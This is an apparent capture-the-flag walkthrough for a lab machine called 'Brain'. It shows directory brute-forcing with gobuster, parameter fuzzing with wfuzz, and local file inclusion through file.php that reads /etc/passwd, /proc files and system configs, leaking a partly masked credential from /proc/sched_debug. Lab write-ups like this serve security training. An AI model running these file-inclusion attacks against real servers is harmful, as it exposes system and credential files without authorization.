# Brain walkthrough
## Directory scan
[main path]
```console
┌──(alienum㉿kali)-[~]
└─$ gobuster dir -k -u http://10.0.2.162/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x .php,.txt,.jpg,.html,.bak,.php.bak
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.0.2.162/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php.bak,php,txt,jpg,html,bak
[+] Timeout:        10s
===============================================================
2021/02/02 15:26:09 Starting gobuster
===============================================================
/index.html (Status: 200)
/robots.txt (Status: 200)
/brainstorm (Status: 301)
```
[brainstorm path]
```console
┌──(alienum㉿kali)-[~]
└─$ gobuster dir -k -u http://10.0.2.162/brainstorm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x .php,.txt,.jpg,.html,.bak,.php.bak
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.0.2.162/brainstorm/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     bak,php.bak,php,txt,jpg,html
[+] Timeout:        10s
===============================================================
2021/02/02 15:29:05 Starting gobuster
===============================================================
/index.html (Status: 200)
/image.jpg (Status: 200)
/file.php (Status: 200)
```
## Get parameter 
```console
┌──(alienum㉿kali)-[~]
└─$ wfuzz -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt   --hh 0  'http://10.0.2.162/brainstorm/file.php?FUZZ=/etc/passwd'
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.0.2.162/brainstorm/file.php?FUZZ=/etc/passwd
Total requests: 2588

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                          
=====================================================================

000000010:   200        26 L     38 W       1401 Ch     "file"                                           

Total time: 0
Processed Requests: 2588
Filtered Requests: 2587
Requests/sec.: 0
```
## LFI, fuzzing files
```console
┌──(alienum㉿kali)-[~]
└─$ wget https://raw.githubusercontent.com/tutorial0/payloads/master/lfi.txt
┌──(alienum㉿kali)-[~]
└─$ wfuzz -w lfi.txt   --hh 0  'http://10.0.2.162/brainstorm/file.php?file=FUZZ'
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.0.2.162/brainstorm/file.php?file=FUZZ
Total requests: 135

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                          
=====================================================================

000000005:   200        3 L      46 W       450 Ch      "/proc/net/tcp"                                  
000000002:   200        31 L     186 W      2226 Ch     "/proc/mounts"                                   
000000004:   200        3 L      33 W       384 Ch      "/proc/net/route"                                
000000001:   200        151 L    1130 W     11693 Ch    "/proc/sched_debug"                              
000000003:   200        4 L      27 W       316 Ch      "/proc/net/arp"                                  
000000008:   200        1 L      14 W       138 Ch      "/proc/version"                                  
000000007:   200        44 L     134 W      1185 Ch     "/proc/net/fib_trie"                             
000000006:   200        2 L      28 W       256 Ch      "/proc/net/udp"                                  
000000014:   200        1 L      4 W        97 Ch       "/proc/cmdline"                                  
000000009:   200        0 L      1 W        27 Ch       "/proc/self/cmdline"                             
000000011:   200        54 L     131 W      1020 Ch     "/proc/self/status"                              
000000010:   200        1 L      52 W       319 Ch      "/proc/self/stat"                                
000000052:   200        151 L    1130 W     11693 Ch    "/proc/sched_debug"                              
000000054:   200        4 L      27 W       316 Ch      "/proc/net/arp"                                  
000000069:   200        17 L     111 W      711 Ch      "/etc/hosts.deny"                                
000000058:   200        44 L     134 W      1185 Ch     "/proc/net/fib_trie"                             
000000071:   200        53 L     53 W       740 Ch      "/etc/group"                                     
000000057:   200        2 L      28 W       256 Ch      "/proc/net/udp"                                  
000000055:   200        3 L      33 W       384 Ch      "/proc/net/route"                                
000000059:   200        1 L      14 W       138 Ch      "/proc/version"                                  
000000056:   200        3 L      46 W       450 Ch      "/proc/net/tcp"                                  
000000053:   200        31 L     186 W      2226 Ch     "/proc/mounts"                                   
000000073:   200        3 L      3 W        25 Ch       "/etc/issue"                                     
000000075:   200        51 L     218 W      1580 Ch     "/etc/ssh/ssh_config"                            
000000078:   200        31 L     186 W      2226 Ch     "/etc/mtab"                                      
000000081:   200        64 L     474 W      2932 Ch     "/etc/protocols"                                 
000000083:   200        2 L      2 W        34 Ch       "/etc/ld.so.conf"                                
000000082:   200        20 L     74 W       435 Ch      "/etc/logrotate.conf"                            
000000084:   200        138 L    859 W      4942 Ch     "/etc/wgetrc"                                    
000000088:   200        1 L      2 W        23 Ch       "/etc/resolv.conf"                               
000000085:   200        26 L     38 W       1401 Ch     "/etc/passwd"                                    
000000087:   200        67 L     257 W      1748 Ch     "/etc/inputrc"                                   
000000105:   200        19 L     120 W      1923 Ch     "/etc/motd"                                      
000000104:   200        1 L      2 W        9 Ch        "/etc/host.conf"                                 
000000106:   200        2 L      2 W        34 Ch       "/etc/ld.so.conf"                                
000000103:   200        12 L     88 W       664 Ch      "/etc/fstab" 
```
## Reading a specific file
```console
┌──(alienum㉿kali)-[~]
└─$ curl http://10.0.2.162/brainstorm/file.php?file=/proc/sched_debug                                                                                                                                                                  2 ⚙
.
.
runnable tasks:
 S           task   PID         tree-key  switches  prio     wait-time             sum-exec        sum-sleep
-----------------------------------------------------------------------------------------------------------
 .
 .
 Ssalomon:M*****   382      2236.249707        16   120         0.000000         4.615692         0.000000 0 0 /
```


https://raw.githubusercontent.com/tutorial0/payloads/master/lfi.txt
